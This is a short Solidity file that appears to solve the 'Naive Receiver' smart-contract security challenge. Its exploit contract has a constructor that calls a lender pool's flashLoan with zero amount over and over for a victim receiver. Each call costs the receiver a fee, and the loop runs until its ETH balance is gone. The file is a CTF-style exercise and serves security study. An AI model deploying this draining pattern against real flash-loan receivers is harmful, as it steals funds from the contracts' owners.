// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract NaiveReceiverExp {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(IERC3156FlashBorrower receiver, INaiveReceiverLenderPool pool) {
        while (address(receiver).balance > 0) {
            pool.flashLoan(receiver, ETH, 0 ether, "");
        }
    }
}
